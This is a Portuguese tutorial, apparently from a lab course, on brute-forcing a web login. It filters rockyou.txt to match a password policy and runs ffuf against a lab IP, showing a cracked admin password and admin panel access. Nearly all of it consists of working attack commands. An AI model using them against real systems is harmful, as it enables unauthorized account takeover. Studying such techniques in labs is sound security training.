## Política de senha e wordlists

A eficácia do brute-force depende do número de tentativas possíveis e do tempo gasto; portanto, escolha uma **wordlist adequada** à política de senha do alvo. Se a aplicação exige requisitos (ex.: uma maiúscula, uma minúscula, um dígito, mínimo 10 caracteres), filtre sua wordlist para conter apenas senhas que atendam a esses critérios.

Exemplo: reduzir `rockyou.txt` para senhas que correspondem à política:

```
wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
# 14344391

grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt \
  | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

wc -l custom_wordlist.txt
# 151647

```

A filtragem cortou a wordlist original para ~151k entradas compatíveis com a política.

## Preparação do ataque

- Identifique um usuário válido (ex.: `admin`) usando enumeração de usuários.
    
- Intercepte a requisição de login para saber nomes dos parâmetros POST e fragmento de erro retornado quando a senha estiver incorreta.
    

Exemplo de requisição interceptada:

```
POST /index.php
username=admin&password=xxx
Resposta: "Invalid username or password."

```

## Executando brute-force com ffuf

Use a wordlist filtrada e o padrão de resposta para filtrar resultados falsos:

```
ffuf -w ./custom_wordlist.txt \
  -u http://172.17.0.2/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" -fr "Invalid username"

```

Saída (exemplo):

```
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4764ms]
    * FUZZ: Buttercup1

```

Ao achar uma senha válida (ex.: `Buttercup1`), é possível autenticar como `admin` e acessar o painel de administração:

```
http://<SERVER_IP>:<PORT>/admin.php
(Dashboard, Posts, Categories, Comments, Users, etc.)

```